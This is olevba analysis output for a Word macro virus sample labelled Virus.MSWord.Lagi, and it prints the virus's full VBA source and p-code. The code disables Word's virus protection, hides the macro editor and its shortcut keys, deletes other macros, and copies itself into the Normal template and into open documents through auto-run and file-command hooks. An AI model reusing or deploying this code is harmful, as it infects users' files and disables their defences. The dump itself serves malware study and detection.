olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lagi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Lagi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MARSandDMarelover.bas 
in file: ./Virus.MSWord.Lagi - OLE stream: 'Macros/VBA/MARSandDMarelover'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public MARSalerts
Public MARSdocsaving
Public MARSnormal
Public MARSdocument
Sub MARSsetup()
    MARSalerts = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call MARSbreakdown
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi()
Application.DisplayAlerts = MARSalerts
End Sub
Sub USA_is_BAD_country_no1()
    Call MARSbreakdown
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas1
    MARSnormal = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo cinta_itu_memang_indah_nak_kelas1a
    For i = 1 To NT.VBProject.VBComponents.Count
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "MARSandDMarelover" Then MARSnormal = True
      If (NMacr <> "MARSandDMarelover") And (NMacr <> "MARS_is_my_flagForm") And (NMacr <> "MARS_funky_abis_form1") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
cinta_itu_memang_indah_nak_kelas1a:
    If MARSnormal = False Then
      On Error GoTo cinta_itu_memang_indah_nak_kelas1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "MARSandDMarelover", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "MARS_is_my_flagForm", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "MARS_funky_abis_form1", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
cinta_itu_memang_indah_nak_kelas1:
    End If
kita_jalin_cinta_itu_sejak_dulu_kelas1:
End Sub
Sub Love_kill_War()
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas2
    MARSdocsaving = 0
    MARSdocument = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo cinta_itu_memang_indah_nak_kelas2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "MARSandDMarelover" Then MARSdocument = True
      NMacr = NT.VBProject.VBComponents(i).Name
      If NMacr = "MARSandDMarelover" Then MARSdocument = True
      If (NMacr <> "MARSandDMarelover") And (NMacr <> "MARS_is_my_flagForm") And (NMacr <> "MARS_funky_abis_form1") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
cinta_itu_memang_indah_nak_kelas2a:
    If MARSdocument = False Then
      On Error GoTo cinta_itu_memang_indah_nak_kelas2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MARSandDMarelover", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MARS_is_my_flagForm", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "MARS_funky_abis_Form1", Object:=wdOrganizerObjectProjectItems
             
      MARSdocsaving = 1
cinta_itu_memang_indah_nak_kelas2:
    End If
kita_jalin_cinta_itu_sejak_dulu_kelas2:
End Sub
Sub MARS_is_my_flag()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
End Sub
Sub MARSbreakdown()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Sering_Saving_itu_bih_baik()
    On Error GoTo cinta_itu_memang_indah_nak_kelas4
Set AD = ActiveDocument
    If MARSdocsaving = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
cinta_itu_memang_indah_nak_kelas4:
End Sub
Sub AutoOpen()
    Call MARS_is_my_flag
End Sub
Sub FileClose()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call MARS_is_my_flag
    Dialogs(wdDialogFileOpen).Show
    Call MARSsetup
    Call Love_kill_War
    Call Sering_Saving_itu_bih_baik
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
End Sub
Sub FileSaveAs()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas3
    MARS_is_my_flagForm.Show
kita_jalin_cinta_itu_sejak_dulu_kelas3:
End Sub
Sub FileExit()
    Call MARSsetup
    Call USA_is_BAD_country_no1
    Call Love_kill_War
    On Error GoTo kita_jalin_cinta_itu_sejak_dulu_kelas4
    If WeekDay(Date) = 6 Then MARS_is_my_flagForm.Show
kita_jalin_cinta_itu_sejak_dulu_kelas4:
    Call Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call MARS_is_my_flag
End Sub
Sub FileNew()
    Call MARS_is_my_flag
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call MARS_is_my_flag
End Sub
Sub ToolsMacro()
    Call MARS_is_my_flag
End Sub
Sub ToolsCustomize()
    Call MARS_is_my_flag
End Sub
Sub ToolsCustomizeKeyboard()
    Call MARS_is_my_flag
End Sub
Sub ViewVBCode()
    Call MARS_is_my_flag
End Sub
Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA MACRO MARS_is_my_flagForm.frm 
in file: ./Virus.MSWord.Lagi - OLE stream: 'Macros/VBA/MARS_is_my_flagForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 











































































































Private Sub CommandButton1_Click()
MARS_funky_abis_form1.Show
Unload Me
End Sub

Private Sub CommandButton2_Click()
MARS_funky_abis_form1.Show
Unload Me
End Sub

Private Sub CommandButton4_Click()
MARS_funky_abis_form1.Show
Unload Me
End Sub

Private Sub Label1_Click()

End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO MARS_funky_abis_form1.frm 
in file: ./Virus.MSWord.Lagi - OLE stream: 'Macros/VBA/MARS_funky_abis_form1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Lagi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/MARSandDMarelover - 9199 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn MARSalerts
' Line #1:
' 	Dim (Public) 
' 	VarDefn MARSdocsaving
' Line #2:
' 	Dim (Public) 
' 	VarDefn MARSnormal
' Line #3:
' 	Dim (Public) 
' 	VarDefn MARSdocument
' Line #4:
' 	FuncDefn (Sub MARSsetup())
' Line #5:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St MARSalerts 
' Line #6:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #7:
' 	ArgsCall (Call) MARSbreakdown 0x0000 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #9:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #10:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #12:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #15:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #16:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #17:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #18:
' 	OnError (GoTo 0) 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Sub Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi())
' Line #21:
' 	Ld MARSalerts 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub USA_is_BAD_country_no1())
' Line #24:
' 	ArgsCall (Call) MARSbreakdown 0x0000 
' Line #25:
' 	OnError kita_jalin_cinta_itu_sejak_dulu_kelas1 
' Line #26:
' 	LitVarSpecial (False)
' 	St MARSnormal 
' Line #27:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #28:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #29:
' 	OnError cinta_itu_memang_indah_nak_kelas1a 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #31:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #32:
' 	Ld NMacr 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MARSnormal 
' 	EndIf 
' Line #33:
' 	Ld NMacr 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0013 "MARS_is_my_flagForm"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0015 "MARS_funky_abis_form1"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #34:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	Label cinta_itu_memang_indah_nak_kelas1a 
' Line #38:
' 	Ld MARSnormal 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #39:
' 	OnError cinta_itu_memang_indah_nak_kelas1 
' Line #40:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0013 "MARS_is_my_flagForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0015 "MARS_funky_abis_form1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #43:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	Label cinta_itu_memang_indah_nak_kelas1 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Label kita_jalin_cinta_itu_sejak_dulu_kelas1 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub Love_kill_War())
' Line #49:
' 	OnError kita_jalin_cinta_itu_sejak_dulu_kelas2 
' Line #50:
' 	LitDI2 0x0000 
' 	St MARSdocsaving 
' Line #51:
' 	LitVarSpecial (False)
' 	St MARSdocument 
' Line #52:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #53:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #54:
' 	OnError cinta_itu_memang_indah_nak_kelas2a 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #56:
' 	Ld i 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #57:
' 	Ld NMacr 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MARSdocument 
' 	EndIf 
' Line #58:
' 	Ld i 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #59:
' 	Ld NMacr 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St MARSdocument 
' 	EndIf 
' Line #60:
' 	LineCont 0x0004 13 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0013 "MARS_is_my_flagForm"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0015 "MARS_funky_abis_form1"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #61:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Label cinta_itu_memang_indah_nak_kelas2a 
' Line #65:
' 	Ld MARSdocument 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #66:
' 	OnError cinta_itu_memang_indah_nak_kelas2 
' Line #67:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0011 "MARSandDMarelover"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #68:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0013 "MARS_is_my_flagForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #69:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0015 "MARS_funky_abis_Form1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #70:
' Line #71:
' 	LitDI2 0x0001 
' 	St MARSdocsaving 
' Line #72:
' 	Label cinta_itu_memang_indah_nak_kelas2 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Label kita_jalin_cinta_itu_sejak_dulu_kelas2 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub MARS_is_my_flag())
' Line #77:
' 	ArgsCall (Call) MARSsetup 0x0000 
' Line #78:
' 	ArgsCall (Call) USA_is_BAD_country_no1 0x0000 
' Line #79:
' 	ArgsCall (Call) Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi 0x0000 
' Line #80:
' 	EndSub 
' Line #81:
' 	FuncDefn (Sub MARSbreakdown())
' Line #82:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #83:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #84:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #85:
' 	EndWith 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub Sering_Saving_itu_bih_baik())
' Line #88:
' 	OnError cinta_itu_memang_indah_nak_kelas4 
' Line #89:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #90:
' 	Ld MARSdocsaving 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	Ld AD 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld AD 
' 	ArgsMemCall SaveAs 0x0002 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	Label cinta_itu_memang_indah_nak_kelas4 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub AutoOpen())
' Line #96:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub FileClose())
' Line #99:
' 	ArgsCall (Call) MARSsetup 0x0000 
' Line #100:
' 	ArgsCall (Call) USA_is_BAD_country_no1 0x0000 
' Line #101:
' 	ArgsCall (Call) Love_kill_War 0x0000 
' Line #102:
' 	ArgsCall (Call) Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi 0x0000 
' Line #103:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #104:
' 	EndSub 
' Line #105:
' 	FuncDefn (Sub FileOpen())
' Line #106:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #107:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #108:
' 	ArgsCall (Call) MARSsetup 0x0000 
' Line #109:
' 	ArgsCall (Call) Love_kill_War 0x0000 
' Line #110:
' 	ArgsCall (Call) Sering_Saving_itu_bih_baik 0x0000 
' Line #111:
' 	ArgsCall (Call) Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub FileSaveAs())
' Line #114:
' 	ArgsCall (Call) MARSsetup 0x0000 
' Line #115:
' 	ArgsCall (Call) USA_is_BAD_country_no1 0x0000 
' Line #116:
' 	ArgsCall (Call) Love_kill_War 0x0000 
' Line #117:
' 	ArgsCall (Call) Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi 0x0000 
' Line #118:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub FileSave())
' Line #121:
' 	ArgsCall (Call) MARSsetup 0x0000 
' Line #122:
' 	ArgsCall (Call) USA_is_BAD_country_no1 0x0000 
' Line #123:
' 	ArgsCall (Call) Love_kill_War 0x0000 
' Line #124:
' 	ArgsCall (Call) Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi 0x0000 
' Line #125:
' 	OnError Errh1 
' Line #126:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #127:
' 	Label Errh1 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub HelpAbout())
' Line #130:
' 	OnError kita_jalin_cinta_itu_sejak_dulu_kelas3 
' Line #131:
' 	Ld MARS_is_my_flagForm 
' 	ArgsMemCall Show 0x0000 
' Line #132:
' 	Label kita_jalin_cinta_itu_sejak_dulu_kelas3 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Sub FileExit())
' Line #135:
' 	ArgsCall (Call) MARSsetup 0x0000 
' Line #136:
' 	ArgsCall (Call) USA_is_BAD_country_no1 0x0000 
' Line #137:
' 	ArgsCall (Call) Love_kill_War 0x0000 
' Line #138:
' 	OnError kita_jalin_cinta_itu_sejak_dulu_kelas4 
' Line #139:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld MARS_is_my_flagForm 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #140:
' 	Label kita_jalin_cinta_itu_sejak_dulu_kelas4 
' Line #141:
' 	ArgsCall (Call) Hidup_ini_memang_fana_dont_fear_for_your_ill_hi_hi_hi 0x0000 
' Line #142:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Sub ToolsOptions())
' Line #145:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #146:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub FileNew())
' Line #149:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #150:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Sub FileTemplates())
' Line #153:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub ToolsMacro())
' Line #156:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub ToolsCustomize())
' Line #159:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #162:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub ViewVBCode())
' Line #165:
' 	ArgsCall (Call) MARS_is_my_flag 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub Organizer())
' Line #168:
' 	EndSub 
' Macros/VBA/MARS_is_my_flagForm - 3282 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #108:
' 	Ld MARS_funky_abis_form1 
' 	ArgsMemCall Show 0x0000 
' Line #109:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #113:
' 	Ld MARS_funky_abis_form1 
' 	ArgsMemCall Show 0x0000 
' Line #114:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #118:
' 	Ld MARS_funky_abis_form1 
' 	ArgsMemCall Show 0x0000 
' Line #119:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Private Sub Label1_Click())
' Line #123:
' Line #124:
' 	EndSub 
' Line #125:
' Line #126:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #127:
' Line #128:
' 	EndSub 
' Macros/VBA/MARS_funky_abis_form1 - 1728 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #36:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #37:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Lagi' - OLE stream: 'Macros/MARS_funky_abis_form1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!!!   ANDA BELOM BERUNTUNG  !!!
-------------------------------------------------------------------------------
